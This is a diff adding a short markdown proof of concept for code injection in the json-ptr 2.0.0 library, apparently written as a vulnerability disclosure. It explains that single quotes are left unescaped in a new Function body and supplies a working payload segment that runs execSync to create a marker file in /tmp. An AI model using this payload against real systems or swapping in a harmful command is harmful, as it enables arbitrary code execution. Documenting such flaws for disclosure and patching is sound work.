@@ -1,0 +1,30 @@
+Confirmed working end-to-end through the public `JsonPointer` API.
+
+```javascript
+// json-ptr 2.0.0 — code injection via compilePointerDereference()
+//
+// JsonPointer#get() lazily compiles a dereference function with:
+//   new Function('it', body)
+// where `body` embeds each path segment inside a JS string literal
+// (it['<segment>']) but only escapes backslashes, not single quotes.
+// A path segment containing a single quote breaks out of the string
+// literal and injects arbitrary JavaScript that gets executed when
+// the compiled function runs.
+
+const { JsonPointer } = require("json-ptr");
+
+// Malicious pointer path segment (array form bypasses '/' splitting
+// and the __proto__/constructor/prototype pollution guard entirely,
+// since JsonPointer.get() never routes through setValueAtPath()).
+const evilSegment =
+  "a'], require('child_process').execSync('touch /tmp/pwned_by_json_ptr'), it['a";
+
+const ptr = new JsonPointer([evilSegment]);
+
+// Triggering get() compiles and invokes the poisoned Function body,
+// executing the injected child_process command.
+const result = ptr.get({ a: 1 });
+
+console.log("get() returned:", result);
+console.log("Arbitrary command executed — check /tmp/pwned_by_json_ptr");
+```
